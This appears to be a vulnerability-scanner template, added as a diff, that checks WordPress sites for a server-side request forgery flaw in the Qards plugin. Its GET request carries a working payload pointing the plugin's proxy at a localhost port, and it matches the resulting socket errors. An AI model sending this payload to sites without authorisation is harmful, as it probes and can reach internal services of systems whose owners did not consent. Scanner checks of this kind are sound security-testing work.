@@ -1,0 +1,33 @@
+
+#SSRF Qards Plugin Vulnerability
+#Classification
+#Type:SSRF 
+#OWASP top 10
+#A1: Injection
+#CWE:CWE-918
+
+
+id: Qards-plugin-SSRF
+
+#Informatin About the Author, Vulnerability, Severity Level and its Reference 
+info: 
+  name: Quards - Server Side Request Forgery (SSRF)
+  author: VIEH-TCI Batch-02
+  severity: Critical
+  reference:
+    - https://wpscan.com/vulnerability/454a0ce3-ecfe-47fc-a282-5caa51370645
+    
+requests: 
+  - method: GET
+    path:
+      - "{{BaseURL}}/wp-content/plugins/qards/html2canvasproxy.php?url=http://127.0.0.1:1234"
+    
+    matchers:
+    - type: word
+      words:
+        - 'console.log("error: html2canvas-proxy-php: SOCKET: Connection refused(111)");'
+      condition: or
+      
+    - type: word
+      words:
+        - 'console.log("error: html2canvas-proxy-php: SOCKET: Connection timed out(110)");'
